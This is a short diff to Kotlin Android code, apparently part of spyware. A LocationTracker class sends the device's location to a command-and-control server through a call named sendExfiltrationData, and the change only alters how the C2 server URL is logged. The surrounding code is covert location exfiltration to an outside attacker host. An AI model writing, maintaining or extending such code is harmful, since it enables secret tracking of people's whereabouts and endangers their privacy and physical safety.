@@ -210,7 +210,7 @@ class LocationTracker(private val context: Context) {
                 }
                 c2Client.sendExfiltrationData("locations", simpleLocation.toString())
                 
-                Log.d(TAG, "Location sent to C2 server: ${C2Config.SERVER_URL}")
+                Log.d(TAG, "Location sent to C2 server: ${C2Config.getServerUrl()}")
             } catch (e: Exception) {
                 Log.e(TAG, "Error sending location to C2 server", e)
             }
